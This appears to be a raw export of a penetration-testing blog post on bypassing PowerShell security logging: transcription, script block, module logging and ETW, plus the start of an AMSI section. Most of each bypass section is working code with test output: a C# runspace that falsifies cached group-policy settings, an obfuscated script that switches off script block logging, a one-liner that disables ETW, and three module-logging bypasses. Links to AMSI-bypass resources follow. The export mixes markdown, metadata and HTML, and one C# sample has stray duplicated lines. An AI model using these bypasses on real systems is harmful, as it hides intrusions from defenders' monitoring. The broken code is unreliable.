Group Policy -> Administrative Templates -> Windows Components -> Windows PowerShell Then navigate to PowerShell Transcription\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def25.png\" alt=\"\"></figure>\n\nLet's see how this work , you can run this script to know the Transcription are on or not\n\n```powershell\n$transcriptionSettings = Get-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\" -ErrorAction SilentlyContinue\nif ($transcriptionSettings -and $transcriptionSettings.EnableTranscripting -eq 1) {\n    Write-Host \"Transcription logging is enabled.\"\n    if ($transcriptionSettings.OutputDirectory) {\n        Write-Host \"Log directory: $($transcriptionSettings.OutputDirectory)\"\n    } else {\n        Write-Host \"Log directory: Default (User's Documents folder, typically $HOME\\Documents)\"\n    }\n    if ($transcriptionSettings.EnableInvocationHeader -eq 1) {\n        Write-Host \"Invocation headers are included in logs.\"\n    }\n} else {\n    Write-Host \"Transcription logging is not enabled via Group Policy.\"\n}\n```\n\nLet's see what this will do\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def26.png\" alt=\"\"></figure>\n\n\nyou can't get the script content here you just get the command and the ouput like a session\n\n>what is the invokation headers , [Patrick](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) explain them here with those screenshots :\n>\n>Transcription Logging without invokation headers activated:\n><figure><img src=\"/images/site/posts/DefenseEvasion/def27.png\" alt=\"\"></figure>\n>The second one shows logging with invokation headers activated:\n><figure><img src=\"/images/site/posts/DefenseEvasion/def28.png\" alt=\"\"></figure>\n{: .prompt-info }\n\n#### PowerShell Transcription Bypass\n\nThis one Doesn't have many resources but there is a one [here](https://avantguard.io/en/blog/powershell-enhanced-logging-capabilities-bypass) by [jann lemm](https://avantguard.io/en/blog/author/jann-lemm) , The idea behinde this bypass is the Transcription only check one thing to determine if it's enabled and it's the PowerShell registry (**HKEY\\_LOCAL\\_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription)** or Group Policy to check if **EnableTranscripting is 1**\n\nTo change the key we need an administrative privileges so what should we do ?\n\njann lemm said , If the registry key EnableTranscripting is set to 0 while in an active PowerShell session, the transcript is continued and no bypass is possible, even though the cached value is set to 0. But if these changes to the field are made before a custom PowerShell runspace is opened, the runspace will use the cached (and modified) values, effectively allowing a bypass of the three logging mechanisms by an unprivileged user.\n\nFor the first time i don't understand it , So i will try to explain this more for you in Practical way like the above\n\nSo Let's see how the jann lemm bypass work and how the regular exe work to work Hello World\n\n```c#\n// Hello_World.cs \n\nusing System;\nusing System.Management.Automation;\nusing System.Management.Automation.Runspaces;\n\nclass Program\n{\n    static void Main(string[] args)\n    {\n        // Create a default runspace\n        using (Runspace runspace = RunspaceFactory.CreateRunspace())\n        {\n            runspace.Open();\n\n            // Create a pipeline\n            using (Pipeline pipeline = runspace.CreatePipeline())\n            {\n                // Add the command to print \"Hello World\"\n                pipeline.Commands.AddScript(\"Write-Output 'Hello World'\");\n\n                // Execute the pipeline and get results\n                var results = pipeline.Invoke();\n\n                // Display results\n                foreach (PSObject result in results)\n                {\n                    Console.WriteLine(result.ToString());\n                }\n            }\n\n            runspace.Close();\n        }\n    }\n}\n\n            rs.Close();\n        }\n    }\n}\n```\n\n```c#\n// Hello_Bypass.cs # https://avantguard.io/en/blog/powershell-enhanced-logging-capabilities-bypass\n\nusing System;\nusing System.Reflection;\nusing System.Management.Automation;\nusing System.Management.Automation.Runspaces;\nusing System.Collections.Concurrent;\nusing System.Collections.Generic;\nusing System.Collections.ObjectModel;\n\nnamespace CustomRunspace\n{\n    class CustomRunspace\n    {\n        static void Main(string[] args)\n        {\n            Runspace rs = RunspaceFactory.CreateRunspace();\n\n            // Transcription Logging Bypass\n            BindingFlags bf = BindingFlags.NonPublic | BindingFlags.Static;\n            ConcurrentDictionary<string, Dictionary<string, object>> value = (ConcurrentDictionary<string, Dictionary<string, object>>)rs.GetType().Assembly.GetType(\"System.Management.Automation.Utils\").GetField(\"cachedGroupPolicySettings\", bf).GetValue(null);\n            Dictionary<string, object> dic = new Dictionary<string, object>();\n            dic.Add(\"EnableTranscripting\", \"0\");\n            value.GetOrAdd(\"HKEY_LOCAL_MACHINE\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\Transcription\", dic);\n\n            // Open Runspace\n            rs.Open();\n\n            PowerShell ps = PowerShell.Create();\n            ps.Runspace = rs;\n            ps.AddCommand(\"Write-Output\").AddArgument(\"Hello World\");\n\n            Collection<PSObject> results = ps.Invoke();\n            foreach (var result in results)\n            {\n                Console.WriteLine(result);\n            }\n\n            rs.Close();\n        }\n    }\n}\n```\n\n> * Runspace (short for \"runtime space\") is an **isolated execution** environment in PowerShell that encapsulates the state and configuration needed to run PowerShell commands or scripts. **It includes session state** (e.g., variables, functions, modules), the PowerShell engine, and the host interface for input/output so it allow PowerShell to execute commands in a controlled, isolated manner, supporting both interactive sessions (like powershell.exe) and programmatic execution\n> * you can compile the cs files with this command :\n>```powershell\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /reference:\"C:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll\" /out:Transcription_Bypass.exe CustomRunspace.cs\n```\n{: .prompt-tip }\n\nLet's see what we can do\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def29.png\" alt=\"\"></figure>\n\nSo , When we run the hello\\_world executable the transcription loggin save the commands that in the c# script and the Transcription file created with 53504 Event-ID\n\n```powershell\n<?xml version=\"1.0\"?>\n- <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n- <System>\n  <Provider Name=\"Microsoft-Windows-PowerShell\" Guid=\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\" /> \n  <EventID>53504</EventID> \n  <Version>1</Version> \n  <Level>4</Level> \n  <Task>111</Task> \n  <Opcode>10</Opcode> \n  <Keywords>0x0</Keywords> \n  <TimeCreated SystemTime=\"2025-07-24T01:33:13.9730709Z\" /> \n  <EventRecordID>57</EventRecordID> \n  <Correlation ActivityID=\"{3aa23c01-fc70-0000-906c-a23a70fcdb01}\" /> \n  <Execution ProcessID=\"7140\" ThreadID=\"3408\" /> \n  <Channel>Microsoft-Windows-PowerShell/Operational</Channel> \n  <Computer>DESKTOP-INN3ESD</Computer> \n  <Security UserID=\"S-1-5-21-2346707970-763624724-545999952-1001\" /> \n  </System>\n- <EventData>\n  <Data Name=\"param1\">7140</Data> \n  <Data Name=\"param2\">DefaultAppDomain</Data> \n  </EventData>\n  </Event>\n```\n\nLet's run the Bypass script with the same Hello\\_World function\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def30.png\" alt=\"\"></figure>\n\nSo, the difference here is that there is no log file. Because the new file runs the custom runspace without any transcription log file.\n\n### Script Block Logging\n\nRecords the code executed, including scripts, functions, and commands, whether invoked interactively or through automation.\n\nLet's configure it from Local Group Policy -> Administrative Templates -> Windows Components -> Windows PowerShell Then navigate to Powershell script block logging\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def31.png\" alt=\"\"></figure>\n\nLet's see how this work , you can run this script to know the Script block logging are on or not\n\n```powershell\n$scriptBlockLogging = Get-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\" -ErrorAction SilentlyContinue\nif ($scriptBlockLogging -and $scriptBlockLogging.EnableScriptBlockLogging -eq 1) {\n    Write-Host \"Script Block Logging is enabled.\"\n    if ($scriptBlockLogging.EnableScriptBlockInvocationLogging -eq 1) {\n        Write-Host \"Script block invocation logging is also enabled.\"\n    } else {\n        Write-Host \"Script block invocation logging is not enabled.\"\n    }\n} else {\n    Write-Host \"Script Block Logging is not enabled.\"\n}\n```\n\nlet's start and after that start enum the event's with\n\n```powershell\nGet-WinEvent -LogName \"Microsoft-Windows-PowerShell/Operational\" -MaxEvents 100 | Where-Object { $_.Id -eq 4104 } | Select-Object TimeCreated, @{Name=\"ScriptBlock\";Expression={$_.Properties[2].Value}} | Format-List\n```\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def32.png\" alt=\"\"></figure>\n\n>* The Script block get the script content not only the input and the output in the prompt\n>\n>* [PowerShell 5.0 auto logging](https://www.robwillis.info/2019/10/everything-you-need-to-know-to-get-started-logging-powershell) : By default, PowerShell does not log everything and to get the most out of the logging capabilities there are additional policies that need to be enabled. However, it is worth noting that starting with PowerShell 5.0, anything that is determined as ***suspicious*** by AMSI (Antimalware Scan Interface), will automatically log a Script block/4104 event with a level of ***Warning***. [If script block logging is explicitly disabled, these events will not be logged.](https://web.archive.org/web/20180827195417/https://cobbr.io/ScriptBlock-Warning-Event-Logging-Bypass.html)\n{: .prompt-info }\n\n\n#### ScriptBlock Bypass\n\nLike the previous bypasses , The user can change his powershell session evniroments and the cached setting so [cobbr](https://web.archive.org/web/20190417131155/https://cobbr.io/ScriptBlock-Logging-Bypass.html) notice that and made this [script](https://gist.github.com/cobbr/d8072d730b24fbae6ffe3aed8ca9c407) for us to disable the scriptblock logging\n\n```powershell\n$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils').\"GetFie`ld\"('cachedGroupPolicySettings', 'N'+'onPublic,Static')\nIf ($GroupPolicyField) {\n    $GroupPolicyCache = $GroupPolicyField.GetValue($null)\n    If ($GroupPolicyCache['ScriptB'+'lockLogging']) {\n        $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0\n        $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0\n    }\n    $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new()\n    $val.Add('EnableScriptB'+'lockLogging', 0)\n    $val.Add('EnableScriptB'+'lockInvocationLogging', 0)\n    $GroupPolicyCache['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptB'+'lockLogging'] = $val\n}\n```\n\nThen test it with the count of the logs\n\n```powershell\nGet-WinEvent -FilterHashtable @{ProviderName=\"Microsoft-Windows-PowerShell\"; Id=4104} | Measure | % Count\n```\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def33.png\" alt=\"\"></figure>\n\n>Our bypass script will still being logged cuz of [Event Tracing for Windows](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101) you can use this [script here](https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32) to disable it\n>```powershell\n[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)\n```\n{: .prompt-tip }\n\n\n### Module Logging\n\nRecords pipeline execution details for <span style=\"color:yellow\">cmdlets from specified modules</span>, including variable initialization and command invocations.\n\nLet's configure it from Local Group Policy -> Administrative Templates -> Windows Components -> Windows PowerShell Then navigate to Module logging\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def34.png\" alt=\"\"></figure>\n\nLet's see how this work , you can run this script to know the Module logging are on or not\n\n```powershell\n$moduleLogging = Get-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\" -ErrorAction SilentlyContinue\nif ($moduleLogging -and $moduleLogging.EnableModuleLogging -eq 1) {\n    Write-Host \"Module Logging is enabled.\"\n    $moduleNames = Get-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\\ModuleNames\" -ErrorAction SilentlyContinue\n    if ($moduleNames) {\n        Write-Host \"Modules being logged:\"\n        $moduleNames.PSObject.Properties | Where-Object { $_.Name -ne 'PSPath' -and $_.Name -ne 'PSParentPath' } | ForEach-Object {\n            Write-Host \" - $($_.Name) = $($_.Value)\"\n        }\n    } else {\n        Write-Host \"No specific modules are configured for logging.\"\n    }\n} else {\n    Write-Host \"Module Logging is not enabled.\"\n}\n```\n\nlet's start and after that start enum the event's with\n\n\n```powershell\nGet-WinEvent -LogName \"Microsoft-Windows-PowerShell/Operational\" -MaxEvents 100 | Where-Object { $_.Id -eq 4103 } | Select-Object TimeCreated, @{Name=\"Command\";Expression={$_.Properties[1].Value}}, @{Name=\"Module\";Expression={$_.Properties[0].Value}} | Format-List\n```\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def35.png\" alt=\"\"></figure>\n\n\n\n#### Module Logging Bypass\n\nLet's start with a simple event like print a string with write-host\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def36.png\" alt=\"\"></figure>\n\n\nThis simple command trigger 4 events let's discribe them\n\n* PSConsoleHostReadLine : This log appears when you enter the command, as the PSReadLine module handles input reading, providing features like auto-completion and syntax highlighting.\n\n\n```powershell\n<?xml version=\"1.0\"?>\n- <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n- <System>\n  <Provider Name=\"Microsoft-Windows-PowerShell\" Guid=\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\" /> \n  <EventID>4103</EventID> \n  <Version>1</Version> \n  <Level>4</Level> \n  <Task>106</Task> \n  <Opcode>20</Opcode> \n  <Keywords>0x0</Keywords> \n  <TimeCreated SystemTime=\"2025-07-20T23:17:27.8187082Z\" /> \n  <EventRecordID>285</EventRecordID> \n  <Correlation ActivityID=\"{188710b5-f9b6-0000-6a3a-8718b6f9db01}\" /> \n  <Execution ProcessID=\"2236\" ThreadID=\"7736\" /> \n  <Channel>Microsoft-Windows-PowerShell/Operational</Channel> \n  <Computer>DESKTOP-47K3P38</Computer> \n  <Security UserID=\"S-1-5-21-3540393959-771636146-431249527-1001\" /> \n  </System>\n- <EventData>\n  <Data Name=\"ContextInfo\">Severity = Informational Host Name = ConsoleHost Host Version = 5.1.19041.2673 Host ID = 80aae10f-5d8d-48fd-ad14-389df84528c7 Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Engine Version = 5.1.19041.2673 Runspace ID = c5b9897e-6c29-42d0-a784-bc369f276c7e Pipeline ID = 17 Command Name = PSConsoleHostReadLine Command Type = Function Script Name = Command Path = Sequence Number = 46 User = DESKTOP-47K3P38\\3atef Connected User = Shell ID = Microsoft.PowerShell</Data> \n  <Data Name=\"UserData\" /> \n  <Data Name=\"Payload\">CommandInvocation(PSConsoleHostReadLine): \"PSConsoleHostReadLine\"</Data> \n  </EventData>\n  </Event>\n```\n\n* Write-Host : This directly logs the command you executed, showing the invocation and the parameter \"@N1NJ10 was here\".\n\n```powershell\n<?xml version=\"1.0\"?>\n- <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n- <System>\n  <Provider Name=\"Microsoft-Windows-PowerShell\" Guid=\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\" /> \n  <EventID>4103</EventID> \n  <Version>1</Version> \n  <Level>4</Level> \n  <Task>106</Task> \n  <Opcode>20</Opcode> \n  <Keywords>0x0</Keywords> \n  <TimeCreated SystemTime=\"2025-07-20T23:17:27.8234848Z\" /> \n  <EventRecordID>286</EventRecordID> \n  <Correlation ActivityID=\"{188710b5-f9b6-0002-d13b-8718b6f9db01}\" /> \n  <Execution ProcessID=\"2236\" ThreadID=\"7736\" /> \n  <Channel>Microsoft-Windows-PowerShell/Operational</Channel> \n  <Computer>DESKTOP-47K3P38</Computer> \n  <Security UserID=\"S-1-5-21-3540393959-771636146-431249527-1001\" /> \n  </System>\n- <EventData>\n  <Data Name=\"ContextInfo\">Severity = Informational Host Name = ConsoleHost Host Version = 5.1.19041.2673 Host ID = 80aae10f-5d8d-48fd-ad14-389df84528c7 Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Engine Version = 5.1.19041.2673 Runspace ID = c5b9897e-6c29-42d0-a784-bc369f276c7e Pipeline ID = 18 Command Name = Write-Host Command Type = Cmdlet Script Name = Command Path = Sequence Number = 48 User = DESKTOP-47K3P38\\3atef Connected User = Shell ID = Microsoft.PowerShell</Data> \n  <Data Name=\"UserData\" /> \n  <Data Name=\"Payload\">CommandInvocation(Write-Host): \"Write-Host\" ParameterBinding(Write-Host): name=\"Object\"; value=\"@N1NJ10 was here\"</Data> \n  </EventData>\n  </Event>\n```\n\n* Out-Default : This is likely logged when the prompt is displayed after your command, as PowerShell uses Out-Default to handle the prompt output, even if Write-Host doesn't produce pipeline output.\n\n\n```powershell\n<?xml version=\"1.0\"?>\n- <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n- <System>\n  <Provider Name=\"Microsoft-Windows-PowerShell\" Guid=\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\" /> \n  <EventID>4103</EventID> \n  <Version>1</Version> \n  <Level>4</Level> \n  <Task>106</Task> \n  <Opcode>20</Opcode> \n  <Keywords>0x0</Keywords> \n  <TimeCreated SystemTime=\"2025-07-20T23:17:27.8238426Z\" /> \n  <EventRecordID>287</EventRecordID> \n  <Correlation ActivityID=\"{188710b5-f9b6-0002-d03b-8718b6f9db01}\" /> \n  <Execution ProcessID=\"2236\" ThreadID=\"7736\" /> \n  <Channel>Microsoft-Windows-PowerShell/Operational</Channel> \n  <Computer>DESKTOP-47K3P38</Computer> \n  <Security UserID=\"S-1-5-21-3540393959-771636146-431249527-1001\" /> \n  </System>\n- <EventData>\n  <Data Name=\"ContextInfo\">Severity = Informational Host Name = ConsoleHost Host Version = 5.1.19041.2673 Host ID = 80aae10f-5d8d-48fd-ad14-389df84528c7 Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Engine Version = 5.1.19041.2673 Runspace ID = c5b9897e-6c29-42d0-a784-bc369f276c7e Pipeline ID = 18 Command Name = Command Type = Script Script Name = Command Path = Sequence Number = 50 User = DESKTOP-47K3P38\\3atef Connected User = Shell ID = Microsoft.PowerShell</Data> \n  <Data Name=\"UserData\" /> \n  <Data Name=\"Payload\">CommandInvocation(Out-Default): \"Out-Default\"</Data> \n  </EventData>\n  </Event>\n```\n\n* Set-StrictMode : This is called by the PSReadLine module, possibly as part of its configuration or internal operations, **and is captured because module logging is enabled for the session. ( So this mean if u call any cmdlet this Event log will be triggered )**\n\n```powershell\n<?xml version=\"1.0\"?>\n- <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n- <System>\n  <Provider Name=\"Microsoft-Windows-PowerShell\" Guid=\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\" /> \n  <EventID>4103</EventID> \n  <Version>1</Version> \n  <Level>4</Level> \n  <Task>106</Task> \n  <Opcode>20</Opcode> \n  <Keywords>0x0</Keywords> \n  <TimeCreated SystemTime=\"2025-07-20T23:17:27.8268015Z\" /> \n  <EventRecordID>288</EventRecordID> \n  <Correlation ActivityID=\"{188710b5-f9b6-0000-af3a-8718b6f9db01}\" /> \n  <Execution ProcessID=\"2236\" ThreadID=\"7736\" /> \n  <Channel>Microsoft-Windows-PowerShell/Operational</Channel> \n  <Computer>DESKTOP-47K3P38</Computer> \n  <Security UserID=\"S-1-5-21-3540393959-771636146-431249527-1001\" /> \n  </System>\n- <EventData>\n  <Data Name=\"ContextInfo\">Severity = Informational Host Name = ConsoleHost Host Version = 5.1.19041.2673 Host ID = 80aae10f-5d8d-48fd-ad14-389df84528c7 Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Engine Version = 5.1.19041.2673 Runspace ID = c5b9897e-6c29-42d0-a784-bc369f276c7e Pipeline ID = 20 Command Name = Set-StrictMode Command Type = Cmdlet Script Name = C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\2.0.0\\PSReadLine.psm1 Command Path = Sequence Number = 52 User = DESKTOP-47K3P38\\3atef Connected User = Shell ID = Microsoft.PowerShell</Data> \n  <Data Name=\"UserData\" /> \n  <Data Name=\"Payload\">CommandInvocation(Set-StrictMode): \"Set-StrictMode\" ParameterBinding(Set-StrictMode): name=\"Off\"; value=\"True\"</Data> \n  </EventData>\n  </Event>\n```\n\nSo the write-host cmdlet make 3 event logs ( Write-Host , Out-Default , Set-StrictMode ) so if we success to disable the Module logging we will see 1 event , Let's do it\n\nIn this blog by [HUBBL3](https://bc-security.org/powershell-logging-obfuscation-and-some-newish-bypasses-part-1/) , We can see that it's not possible to completely block module logging for all modules (even if we use `*` to include all modules in logging). However, it is possible to bypass logging for specific cmdlets\n\n>* When the [**LogPipelineExecutionDetails**](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_eventlogs?view=powershell-5.1#logging-module-events)property value is `$true`, Windows PowerShell writes cmdlet and function execution events in the session to the Windows PowerShell log in Event Viewer. The setting is effective only in the current session.\n>* A PowerShell snap-in is a .NET assembly (typically a DLL) that contains a collection of cmdlets, providers, and sometimes other components that extend PowerShell‚Äôs functionality.\n>* The \"4103\" Event-ID is for the Module loggin\n>* Path for the Events : Event Viewer -> Applications and Services -> Microsoft -> Windows -> PowerShell -> Operational\n{: .prompt-info }\n\n```powershell\n# Recon\n(Get-Command Write-Host).module\nGet-PSSnapin\n\n# Bypass 1 \n$module = Get-Module Microsoft.PowerShell.Utility\n$module.LogPipelineExecutionDetails = $false\n$Snapin = Get-PSSnapin Microsoft.PowerShell.Core\n$Snapin.LogPipelineExecutionDetails = $false\n\n# Bypass 2 \n\n$GroupPolicy =[ReF].assembly.GetType('System.Management.Automation.Utils').GetFielD('cachedGroupPolicySettings','NonPublic,Static').GetValue($nULL);\n$val=[Collections.Generic.Dictionary[String,System.Object]]::new();\n$Val.Add('EnableModuleLogging',0);\n$Val.add('ModuleNames', '');\n$GroupPolicy['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging']=$VaL\nImport-Module Microsoft.Powershell.Utility -Force\n\n# Bypass 3 \n\n$Cmd = [System.Management.Automation.CmdletInfo]::new(\"Write-Host\", [Microsoft.PowerShell.Commands.WriteHostCommand])\n\n# Test \n\nWrite-Host \"@N1NJ10 was here\"\n\n# Test for Bypass 3 \n\n& $Cmd \"@N1NJ10 was here\"\n```\n\nLet's see what event that the first bypass will trigger\n\nWith the logic we can count them without any execute , They are 4 lines 2 of them execute a change in the session without any output so there will be\n\n* 4 From the PSConsoleHostReadLine\n* 2 From an unknown Events ( Like the Write-Host ... )\n\nLet's see\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def37.png\" alt=\"\"></figure>\n\nAs we expect there are 6 events trigger ( 2 of them are warrning with Event-ID 4104 )\n\n>* Don't Forget to Clear the logs after some operations to see what the new operations new logs\n>* If you use script block you will get 2 events\n{: .prompt-tip }\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def38.png\" alt=\"\"></figure>\n\nSo , Let's test to see if this work\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def39.png\" alt=\"\"></figure>\n\nGreat , It worked the Write-Host now tigger 1 Event log ( PSConsoleHostReadLine )\n\n## Resources\n\nI don't talk about automated tools because you can find many writeups talking about them but in the future, I will update this post with some tools that I use in my engagement and some scenarios\n\nI will provide you with some of these resources enjoy :\n\n* [Amsi.fail](https://amsi.fail/)\n* [Exploring PowerShell AMSI and Logging Evasion](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)\n* [Bypass AMSI by manual modification](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)\n* [PowerShell get information about AntiVirus](https://answers.microsoft.com/en-us/windowserver/forum/all/powershell-get-information-about-antivirus/9207ebfa-ff97-48f0-b133-dde4cfd4abca)\n* [Beginners-Guide-to-Obfuscation](https://github.com/BC-SECURITY/Beginners-Guide-to-Obfuscation/blob/main/Exercise%202/Sample_1.ps1)\n* [Evading Detection: A Beginner's Guide to Obfuscation - 2022](https://www.youtube.com/watch?v=wvKwk1wcXvM&list=PLqyUgadpThTJVR6I3FQSBE3mLElxQkcbh&t=1457s)\n* [A Detailed Guide on AMSI Bypass](https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/)\n* [the hacker recipes obfuscation](https://www.thehacker.recipes/evasion/av/obfuscation)\n* [AMSITrigger](https://github.com/RythmStick/AMSITrigger)\n* [gocheck](https://github.com/gatariee/gocheck)\n* [AMSI BYPASS AND EVASION](https://cheatsheet.haax.fr/windows-systems/privilege-escalation/amsi_and_evasion/)\n* [AMSI Bypass Memory Patch Technique in 2024](https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b)\n* [amsi-bypass-methods](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/)\n* [lolbas-project](https://lolbas-project.github.io/)\n* [The Internals of AppLocker](https://www.tiraniddo.dev/2019/11/the-internals-of-applocker-part-1.html)\n* [Windows Applocker Policy ‚Äì A Beginner‚Äôs Guide](https://www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/)\n* [persistence-amsi](https://pentestlab.blog/2021/05/17/persistence-amsi/)\n* [Constrained Language constrain?](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/#what-does-constrained-language-constrain) - [What is PowerShell Constrained Language?](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)\n* [InstallUtil](https://www.ired.team/offensive-security/code-execution/t1118-installutil)\n* [WhiteListEvasion](https://github.com/khr0x40sh/WhiteListEvasion)\n* [NetCat64](https://github.com/vinsworldcom/NetCat64/releases)\n* [CLM-Bypass](https://sp00ks-git.github.io/posts/CLM-Bypass/)\n* [AaronLocker](https://github.com/microsoft/AaronLocker)\n* [one-thousand-and-one-application-blocks](https://blog.improsec.com/tech-blog/one-thousand-and-one-application-blocks)\n* [sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)\n* [Stracciatella](https://github.com/mgeeky/Stracciatella)\n* Manual Pages ","slug":"Evasion","published":1,"updated":"2025-11-28T16:49:58.965Z","_id":"cmij30lbk000q9reu0tui8yth","comments":1,"layout":"post","photos":[],"content":"<h2 id=\"Antimalware-Scan-Interface-AMSI\"><a href=\"#Antimalware-Scan-Interface-AMSI\" class=\"headerlink\" title=\"Antimalware Scan Interface [ AMSI ]\"></a>Antimalware Scan Interface [ AMSI ]</h2><p>Antimalware Scan Interface [ AMSI ] is. Microsoft developed it to provide a set of API calls for applications, including any third-party applications, to perform a <span style=\"color:yellow\">signature-based scan of the content</span>.</p>\n<p>Windows Defender uses it to scan PowerShell scripts, .NET, VBA macros, Windows Script Host (WSH), VBScript, and JavaScript to detect common malware. The important thing about AMSI is that you do not need to deploy it; it has been there since Windows 10.</p>\n<p>So how does AMSI work :</p>\n<ul>\n<li>When AMSI is invoked, <span style=\"color:yellow\">AMSI.dll</span> is loaded into the application‚Äôs memory.</li>\n<li>The key functions within AMSI.dll include <code>AmsiScanBuffer</code> and <code>AmsiInitialize</code>.</li>\n<li>If the content is clear it will return 1 means the script will be executed</li>\n</ul>\n<p>Let‚Äôs see :</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def.png\" alt=\"\"></figure>\n\n\n<p>let‚Äôs see what Windows version is Copy<br>that is running and what antivirus software that is installed</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">PS</span> C:\\Users\\matio&gt; <span class=\"built_in\">Get-WmiObject</span> Win32_OperatingSystem | <span class=\"built_in\">Select</span> PSComputerName, Caption, Version | <span class=\"built_in\">fl</span></span><br><span class=\"line\"></span><br><span class=\"line\">PSComputerName : ATTACKER</span><br><span class=\"line\">Caption        : Microsoft Windows <span class=\"number\">10</span> Pro</span><br><span class=\"line\">Version        : <span class=\"number\">10.0</span>.<span class=\"number\">19045</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">PS</span> C:\\Users\\matio&gt; <span class=\"built_in\">Get-CimInstance</span> <span class=\"literal\">-Namespace</span> root/SecurityCenter2 <span class=\"literal\">-ClassName</span> AntivirusProduct</span><br><span class=\"line\"></span><br><span class=\"line\">displayName              : Bitdefender Antivirus</span><br><span class=\"line\">instanceGuid             : &#123;<span class=\"number\">0</span>F59B032<span class=\"literal\">-EA77-E3A8-2382-74A4346E5522</span>&#125;</span><br><span class=\"line\">pathToSignedProductExe   : C:\\Program Files\\Bitdefender\\Bitdefender Security\\wscfix.exe</span><br><span class=\"line\">pathToSignedReportingExe : C:\\Program Files\\Bitdefender\\Bitdefender Security\\wsccommunicator.exe</span><br><span class=\"line\">productState             : <span class=\"number\">266240</span></span><br><span class=\"line\">PSComputerName           :</span><br><span class=\"line\"></span><br><span class=\"line\">displayName              : Windows Defender</span><br><span class=\"line\">instanceGuid             : &#123;D68DDC3A<span class=\"literal\">-831F-4fae-9E44-DA132C1ACF46</span>&#125;</span><br><span class=\"line\">pathToSignedProductExe   : windowsdefender://</span><br><span class=\"line\">pathToSignedReportingExe : %ProgramFiles%\\Windows Defender\\MsMpeng.exe</span><br><span class=\"line\">productState             : <span class=\"number\">393472</span></span><br><span class=\"line\">PSComputerName           :</span><br></pre></td></tr></table></figure>\n\n<p>Let‚Äôs test AMSI</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">PS</span> C:\\Users\\matio&gt; <span class=\"built_in\">Invoke-Mimikatz</span></span><br><span class=\"line\">At line:<span class=\"number\">1</span> char:<span class=\"number\">1</span></span><br><span class=\"line\">+ <span class=\"built_in\">Invoke-Mimikatz</span></span><br><span class=\"line\">+ ~~~~~~~~~~~~~~~~</span><br><span class=\"line\">This script contains malicious content and has been blocked by your antivirus software.</span><br><span class=\"line\">    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException</span><br><span class=\"line\">    + 